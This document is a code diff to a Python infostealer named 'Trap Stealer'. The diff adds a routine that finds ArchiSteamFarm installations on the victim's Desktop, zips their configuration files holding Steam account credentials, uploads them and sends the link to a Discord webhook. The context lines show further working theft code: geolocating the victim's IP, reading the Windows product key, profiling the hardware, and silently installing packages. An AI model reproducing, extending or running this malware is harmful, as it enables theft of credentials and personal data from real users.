@@ -3,7 +3,7 @@ import os, re, socket, subprocess
 import winreg
 from urllib.parse import urlparse
 from os.path import isfile, exists
-from shutil import copy 
+from shutil import copy
 import sqlite3
 from base64 import b64decode
 import winreg
@@ -32,7 +32,8 @@ hidewindow = '%Hide%'
 changebio = '%ChangeBio%'
 biotext = '%Text%'
 Drive = '%Drive%'
-close_proc = '%CloseProc'
+close_proc = '%CloseProc%'
+ArchiStealer = '%ArchiStealer%'
 
 # WEBSITE UPLOAD 
 
@@ -59,7 +60,7 @@ for module in requirements:
 try:
     from Cryptodome.Cipher import AES
 except:
-    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
+    subprocess.Popen(executable + " -m pip install Crypto ", shell=True)
     from Crypto.Cipher import AES
     
 import requests
@@ -359,9 +360,70 @@ def steal_driver():
                     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         except:
             pass
-                
-                
 
+def ArchiSteamFarm():
+    def search_for_exe(filename, start_dir):
+        found_folders = []
+        for root, dirs, files in os.walk(start_dir):
+            for file in files:
+                if filename.lower() == file.lower():
+                    found_folders.append(root)
+                    break  
+        return found_folders
+
+        
+
+    def zip_config_folders(folders, base_zip_filename):
+        zip_filename = os.path.join(tempfile.gettempdir(), base_zip_filename + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)) + ".zip")
+        with zipfile.ZipFile(zip_filename, 'w') as zipf:
+            for folder in folders:
+                config_folder = os.path.join(folder, 'config')
+                if os.path.exists(config_folder):
+                    for root, dirs, files in os.walk(config_folder):
+                        for file in files:
+                            file_path = os.path.join(root, file)
+                            zipf.write(file_path, os.path.join('config', f'{folder}_{file}'))
+        return zip_filename
+    try:
+        found_folders = search_for_exe("archisteamfarm.exe", os.path.join(os.path.expanduser('~'), 'Desktop'))
+    except:
+        pass
+    
+    if found_folders:
+        try:
+            zip_filename = zip_config_folders(found_folders, "ArchiSteamFarmConf")
+            file_url = upload_file(zip_filename)
+            data = {
+                    "username": "Trap Stealer",
+                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                    "embeds": [
+                        {
+                            "title": "ArchiSteamFarm Stealer stealer",
+                            "description": f"All config files found!",
+                            "color": 0xffb6c1,
+                            "fields": [
+                                {"name": f"WhatsApp file", "value": f"[Click here to download]({file_url})"},
+                            ],
+                            "thumbnail": {
+                                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            },
+                            "footer": {
+                                "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            }
+                        }
+                    ]
+            }
+
+            headers = {
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+            }
+
+            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        
+        except:
+            pass
 
 
 def check_python_or_convert(file_path):
@@ -607,7 +669,7 @@ def get_product_name():
     try:return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
     except:return "Couldn't get Product Name"
 PasswCount = 0
-def globalInfo():
+def globalInfo():  
     pr = get_product_name()
     winkey = get_product_key()
     url = 'nosj/oi.ofnipi//:sptth'[::-1]
@@ -644,7 +706,6 @@ def globalInfo():
         system = os.name
     except:
         system = "Error getting os name!"
-        
     try: 
         windll = ctypes.windll.kernel32
         language = windows_locale[ windll.GetUserDefaultUILanguage() ]
@@ -657,7 +718,6 @@ def globalInfo():
                 try:
                     gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
                 except: gpu= "ERROR"
-                
         elif system == 'nt':
             try:
                 gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
@@ -666,13 +726,12 @@ def globalInfo():
                 used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read().strip()
                 temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read().strip()
 
-                gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\n\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
+                gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
 
             except Exception as e:
                 gpu = f"`An error occurred"
     except:
         gpu = "error"
-
     globalinfo = f"""
     :flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`
     \n User-Agent : {user_agent}
